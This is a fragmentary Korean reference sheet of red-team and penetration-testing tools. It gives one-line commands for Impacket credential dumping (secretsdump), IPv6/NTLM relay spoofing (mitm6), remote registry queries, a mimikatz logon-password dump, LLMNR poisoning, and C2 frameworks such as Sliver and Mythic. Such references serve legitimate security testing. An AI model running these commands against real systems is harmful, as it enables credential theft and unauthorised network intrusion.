...
실무에서 바로 꺼내 쓰는 레드팀 / 펜테스팅 도구 정리. 각 도구의 핵심 용도와 자주 쓰는 명령어를 정리했다.
...
| 스크립트 | 용도 | 주요 명령어 |
|---------|------|-----------|
| `secretsdump.py` | DCSync, SAM/NTDS dump | `secretsdump.py DOMAIN/user:pass@DC_IP` |
...
| `mitm6.py` | IPv6/DNS Spoofing | `mitm6 -d DOMAIN` (ntlmrelayx와 연계하여 IPv6 환경 NTLM relay) |
...
| `reg.py` | 원격 Registry | `reg.py DOMAIN/user:pass@TARGET query -keyName HKLM\\...` |
...
WinRM 기반 원격 shell. 파일 전송, PowerShell 모듈 로드 지원.
...
Windows credential dump 및 조작 도구.

```powershell
# 기본 실행
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# NTLM hash & 평문 비밀번호 dump
...
LLMNR/NBT-NS/mDNS 포이즈닝 및 NTLM hash capture.
...
| `Covenant` | C2 framework (.NET) | [GitHub](https://github.com/cobbr/Covenant) |
| `Sliver` | Go 기반 C2 framework | [GitHub](https://github.com/BishopFox/sliver) |
| `Havoc` | C2 framework | [GitHub](https://github.com/HavocFramework/Havoc) |
| `CrackStation` | 온라인 hash 룩업 | [crackstation.net](https://crackstation.net) |
...
| `Pacu` | AWS 공격 framework | `pacu` → session 생성 후 모듈 실행 |
...
참고: 실환경에서는 탐지/차단 정책이 agent로 강제될 수 있습니다. PoC는 격리된 테스트 클러스터에서 수행하세요.

### C2 / 에뮬레이션

| 도구 | 용도 | 빠른 시작 |
|------|------|---------|
| `Mythic` | 확장형 C2 framework | `git clone https://github.com/its-a-feature/Mythic && cd Mythic && ./mythic-cli start` |
...
| `Sliver` | Go 기반 C2 (이미 위 표 참고) | `sliver-server` → Implant 생성/listener 구성 |
